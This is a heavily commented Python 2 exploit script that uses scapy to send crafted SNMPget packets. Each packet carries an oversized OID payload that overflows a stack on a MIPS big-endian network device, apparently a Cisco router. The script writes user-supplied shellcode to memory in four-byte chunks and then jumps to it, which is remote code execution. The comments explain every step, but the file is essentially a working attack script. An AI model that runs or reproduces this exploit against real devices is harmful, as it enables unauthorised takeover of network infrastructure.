#python 2.7
#import modules
#scapy is a packet crafting module
from scapy.all import *
#time modules provides time related functions
from time import sleep
#struct module performs conversions between python values and C structs
from struct import pack, unpack
#random module implements pseudo-random number generators for various distributions.
import random
#argparse module is for command-line parsing
import argparse
#The sys module provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter.
import sys
#termcolor module for ANSII Color formatting for output in terminal.
from termcolor import colored

#try the following
try:
    #import capstone module, a dissasembler (https://www.capstone-engine.org/lang_python.html), and set to cs variable
	cs = __import__('capstone')
#if an import error occurs (If python cannot find the module) then continue with the code
except ImportError:
	pass

#defince bin2oid function which will translate your shellcode from binary to oid values so snmp can read it
def bin2oid(buf):
    #loop through the values in buf and unpack each one in unsigned character format ('B')
    #unpack outputs a tuple, call the first value in the tuple with [0]
    #set the returned value to a string
    #put a . in front and join the value
    return ''.join(['.' + str(unpack('B',x)[0]) for x in buf])

#define shift function
def shift(s, offset):
    #set res variable to pack value of s plus the value of offset in big-endian byte order
    res = pack('>I', unpack('>I', s)[0] + offset)
    #return res variable
    return res


#set alps_oid variable to snmp string, the {} define where your shellcode will end up
alps_oid = '1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81{0}{1}{2}{3}{4}{5}{6}{7}.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50{8}{9}.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115{10}{11}.11.187.147.166.116.171.114.126.109.248.144.111.30'
#set shellcode_start variable to ascii characters with hex value
shellcode_start = '\x80\x00\xf0\x00'

#when python files are run directly name is set to main
#if the file was imported then name would be set to the file name
#if name is equal to main run the block
#this ensures the file is being run as a stand alone program
if __name__ == '__main__':
    #set parser variable, this block will define the arguments and what they do for the program
    parser = argparse.ArgumentParser()
    #add host, community and shellcore arguments to parser
    parser.add_argument("host", type=str, help="host IP")
    parser.add_argument("community", type=str, help="community string")
    parser.add_argument("shellcode", action='store', type=str, help='shellcode to run (in hex)')
    #set args variable
    args = parser.parse_args()

    #set sh_buf variable to the decoded hex data passed to the shellcode argument, and removes whitespace
    sh_buf = args.shellcode.replace(' ','').decode('hex')
    #print out string and shellcode_start variable encoded in hex
    print 'Writing shellcode to 0x{}'.format(shellcode_start.encode('hex'))
    #if capstone module was successfully imported
    if 'capstone' in sys.modules: 
        #set md variable to initialize capstone module and set the 
        #hardware architecture and the hardware mode piped to BIG ENDIAN 
        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)

    
    #for loop through k and sh_dword, which will equal the tuple returned from enumerate 
    #(enumerate() returns a tuple containing a count (from start which defaults to 0) and the values obtained from iterating over sequence:)
    #enumerate sh_buf list values i through i+4
    #i will equal the values from the for loop of the range 
    #range starting at 0, stoping at the length of sh_buf and stepping through 4 at a time
    #start enumeration at index 4 
    for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
        s0 = bin2oid(sh_dword)  # shellcode dword
        #set below variables to ascii characters with hex value (reference string literals) and call bin2oid function
        #this will be used to setup your shellcode, the bin2oid function is translating your shellcode from binary to oid values
        #so snmp can read it
        s1 = bin2oid('\x00\x00\x00\x00')  
        s2 = bin2oid('\xBF\xC5\xB7\xDC')
        s3 = bin2oid('\x00\x00\x00\x00')
        s4 = bin2oid('\x00\x00\x00\x00')
        s5 = bin2oid('\x00\x00\x00\x00')
        s6 = bin2oid('\x00\x00\x00\x00')
        ra = bin2oid('\xbf\xc2\x2f\x60') # return control flow jumping over 1 stack frame
        s0_2 = bin2oid(shift(shellcode_start, k * 4))
        ra_2 = bin2oid('\xbf\xc7\x08\x60')
        s0_3 = bin2oid('\x00\x00\x00\x00')
        ra_3 = bin2oid('\xBF\xC3\x86\xA0')
        
        #set payload variable to the value of alps_oid set previously in the code, and append the s0 etc variables into the
        #spots of the alps_oid variable containing {0}{1}{2}{3}{4}{5}{6}{7} etc, this will contain the shellcode you want
        payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
        
        #send packet using scapy send module 
        #dst is ip provided as argyment, the source port and destination port are 161
        #the community string is the argument supplied to the community value
        #PDU set to SNMPget class which is provided with the payload variable 
            #info on usage here https://scapy.readthedocs.io/en/latest/advanced_usage.html?highlight=snmpget 
            #example
                #a=SNMP(version=3, PDU=SNMPget(varbindlist=[SNMPvarbind(oid="1.2.3",value=5),
...                                            #SNMPvarbind(oid="3.2.1",value="hello")]))
            #Each SNMP message contains a protocol data unit (PDU). These SNMP PDUs are used for communication between SNMP managers and SNMP agents
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))

        #set cur_addr variable to the unpacked format of >I, which is big-endian and unsigned integer
        #unpack the string of shellcode start shifted by the value of k multiplied by 4
        #unpack outputs a tuple, call the first value in the tuple with [0]
        cur_addr = unpack(">I",shift(shellcode_start, k * 4 + 0xa4))[0]

        #if capstone module was successfully imported
        if 'capstone' in sys.modules: 
            #run for loop and use run disasm with the options set by the values from md variable
            #then dissasemble the code from sh_dword using the address of the first instruction (cur_addr)
            #set output to i, which is a tuple
            for i in md.disasm(sh_dword, cur_addr):
                #set variable color to string green
                color = 'green'
                #print the address of i, encode the value of sh_dword in hex, return the mnemonic of i and color it green, return the op_str of i and color it green
                print("0x%x:\t%s\t%s\t%s" %(i.address, sh_dword.encode('hex'), colored(i.mnemonic, color), colored(i.op_str, color)))
        else:
            #if it is not loaded then print the following
            print("0x%x:\t%s" %(cur_addr, sh_dword.encode('hex')))
            
        sleep(1)
    #set ans vaiable to the user input
    ans = raw_input("Jump to shellcode? [yes]: ")
    
    #if ans equals yes then
    if ans == 'yes':
        #set ra variable to the bin2oid function output of shift function defined above
        ra = bin2oid(shift(shellcode_start, 0xa4)) # return control flow jumping over 1 stack frame
        #set zero to the bin2oid function output of \x00\x00\x00\x00 which becomes 0.0.0.0
        zero = bin2oid('\x00\x00\x00\x00')
        #set payload variable to the value of alps_oid set previously in the code, and append the zero and ra variables into the
        #spots of the alps_oid variable containing {0}{1}{2}{3}{4}{5}{6}{7} etc
        payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
        #send packet using scapy send module 
        #dst is ip provided as argyment, the source port and destination port are 161
        #the community string is the argument supplied to the community value
        #PDU set to SNMPget class which is provided with the payload variable 
            #info on usage here https://scapy.readthedocs.io/en/latest/advanced_usage.html?highlight=snmpget 
            #example
                #a=SNMP(version=3, PDU=SNMPget(varbindlist=[SNMPvarbind(oid="1.2.3",value=5),
...                                            #SNMPvarbind(oid="3.2.1",value="hello")]))
            #Each SNMP message contains a protocol data unit (PDU). These SNMP PDUs are used for communication between SNMP managers and SNMP agents
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
        #print message to user 'Jump Taken!'
        print 'Jump taken!'
